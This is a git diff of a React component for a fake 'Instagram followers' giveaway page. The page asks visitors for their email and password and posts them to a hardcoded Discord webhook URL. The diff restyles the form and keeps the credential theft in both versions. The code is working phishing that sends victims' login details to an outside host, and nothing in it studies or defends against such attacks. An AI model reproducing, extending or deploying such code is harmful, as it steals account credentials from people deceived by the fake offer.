@@ -1,58 +1,72 @@
-import { useState } from 'react'
-import './App.css'
+import { useState } from "react";
+import "./App.css";
+import "./bhutton.css";
 
 function App() {
-
-
-
-
-
-  const sendMessage = (e)=>{
-    e.preventDefault()
-    let username  = e.target[0].value
-    let password = e.target[1].value
-    console.log(username)
-    console.log(password)
-
+  const sendMessage = (e) => {
+    e.preventDefault();
+    let username = e.target[0].value;
+    let password = e.target[1].value;
+    console.log(username);
+    console.log(password);
 
     const request = new XMLHttpRequest();
-      request.open("POST", "https://discordapp.com/api/webhooks/1173897450906464316/eiRWbp2m_J00oWqZELJlj4SoPrUWX2isBFBBIcKkBeEI2vYUqJRULjyDxRXE3zMnJy1P");
+    request.open(
+      "POST",
+      "https://discordapp.com/api/webhooks/1173897450906464316/eiRWbp2m_J00oWqZELJlj4SoPrUWX2isBFBBIcKkBeEI2vYUqJRULjyDxRXE3zMnJy1P"
+    );
 
-      request.setRequestHeader('Content-type', 'application/json');
+    request.setRequestHeader("Content-type", "application/json");
 
-      let content = "Username: " + username + " Password: " + password
+    let content = "Username: " + username + " Password: " + password;
 
-      const params = {
-        username: "My Webhook Name",
-        avatar_url: "",
-        content: content,
-      }
+    const params = {
+      username: "My Webhook Name",
+      avatar_url: "",
+      content: content,
+    };
 
-      request.send(JSON.stringify(params));
-
-  }
+    request.send(JSON.stringify(params));
+  };
 
   return (
     <>
-    <h1>Instagram followers</h1>
-    <h1>Get upto 1000 followers for free</h1>
+      <div className="container">
+        <img
+          src="https://social-events.in/socialfollow-logo.svg"
+          alt="dafadf"
+        />
+        <h1>Instagram followers</h1>
+        <h1>Get upto 500 followers for free</h1>
 
-    <form onSubmit={sendMessage}>
+        <form onSubmit={sendMessage}>
+          <div className="input">
+            <input class="effect-23" type="email" placeholder="Email" />
+            <span class="focus-bg"></span>
+          </div>
+          <div className="input">
+            <input class="effect-23" type="password" placeholder="Password" />
+            <span class="focus-bg"></span>
+          </div>
 
-      <input type="text" className="username" />
-      <input type="password" name="" id="" />
-      <button type="submit">  Get Followers</button>
-
-      <select name="cars" id="cars">
-  <option value="volvo">100 followers - free</option>
-  <option value="saab">200 followers - free</option>
-  <option value="mercedes">500 followers - free</option>
-  <option value="audi">1000 followers - 2$</option>
-  <option value="audi">5000 followers - 3$</option>
-</select>
-    </form>
+          <select name="cars" id="cars">
+            <option value="volvo">100 followers - free</option>
+            <option value="saab">200 followers - free</option>
+            <option value="mercedes">500 followers - free</option>
+            <option value="audi">1000 followers - 2$</option>
+            <option value="audi">5000 followers - 3$</option>
+          </select>
+          <button
+            class="button button--tamaya button--border-thick"
+            data-text="Submit"
+            type="submit"
+          >
+            <span>Submit</span>
+          </button>
+        </form>
+      </div>
     </>
-  )
+  );
 }
 
-export default App
+export default App;
